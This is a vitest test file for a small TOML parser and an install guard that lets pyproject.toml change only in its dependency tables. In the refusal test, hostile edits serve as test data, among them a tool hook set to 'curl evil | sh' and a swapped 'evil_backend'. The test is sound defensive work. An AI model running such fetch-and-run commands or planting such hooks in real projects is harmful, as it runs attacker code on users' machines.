// The TOML reader and the pyproject.toml dependency-only check of the
// install cage. Pure; no I/O.

import { describe, expect, it } from "vitest";
import { onlyDependenciesChanged } from "./install-guard.js";
import { TomlScalar, parseToml } from "./toml-lite.js";

const base = `
# a project
[project]
name = "app"
version = "0.1.0"
dependencies = [
  "httpx>=0.27", # comment
  'rich',
]
[project.optional-dependencies]
dev = ["pytest"]

[tool.poetry.group.dev.dependencies]
black = { version = "^24", optional = true }

[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[[tool.mytool.hook]]
cmd = """
multi
line"""
when = 1979-05-27 07:32:00Z
n = 1_000
`;

const b = (s: string) => Buffer.from(s, "utf8");

describe("toml-lite", () => {
  it("reads tables, arrays of tables, inline tables, every string form and scalars", () => {
    const t = parseToml(base);
    const at = (...keys: Array<string | number>) =>
      keys.reduce<unknown>((o, k) => (o as Record<string | number, unknown>)[k], t);
    expect(at("project", "dependencies")).toEqual(["httpx>=0.27", "rich"]);
    expect(at("tool", "poetry", "group", "dev", "dependencies", "black", "version")).toBe("^24");
    expect(at("tool", "mytool", "hook", 0, "cmd")).toBe("multi\nline");
    expect(at("tool", "mytool", "hook", 0, "n")).toEqual(new TomlScalar("1000"));
    expect(at("tool", "mytool", "hook", 0, "when")).toEqual(new TomlScalar("1979-05-27T07:32:00Z"));
    expect(parseToml('a."b.c" = "\\u00e9"')).toEqual({ a: { "b.c": "é" } });
  });

  it("throws on what it cannot read", () => {
    for (const bad of ["a = ", "[a", "a = [1, 2", 'a = "x\ny"', "a = 1\na = 2", "a = 1 b"]) {
      expect(() => parseToml(bad), bad).toThrow();
    }
  });
});

describe("pyproject.toml: only dependency tables may change", () => {
  it("accepts added or changed dependencies, groups and extras", () => {
    const after = base
      .replace('"httpx>=0.27", # comment', '"httpx>=0.28",\n  "requests>=2.32",')
      .replace('dev = ["pytest"]', 'dev = ["pytest", "mypy"]')
      .replace('black = { version = "^24", optional = true }', 'black = "^24"\nruff = "*"');
    expect(
      onlyDependenciesChanged(
        "pyproject.toml",
        b(base),
        b(`${after}\n[dependency-groups]\nlint = ["ruff"]\n`),
      ),
    ).toBe(true);
  });

  it("refuses scripts, entry points, the build backend, tool hooks, and unreadable results", () => {
    for (const after of [
      `${base}\n[project.scripts]\nls = "evil:main"\n`,
      base.replace("setuptools.build_meta", "evil_backend"),
      base.replace('cmd = """\nmulti\nline"""', 'cmd = "curl evil | sh"'),
      base.replace('version = "0.1.0"', 'version = "0.1.1"'),
      `${base}\n[project\n`,
    ]) {
      expect(onlyDependenciesChanged("pyproject.toml", b(base), b(after))).toBe(false);
    }
  });
});
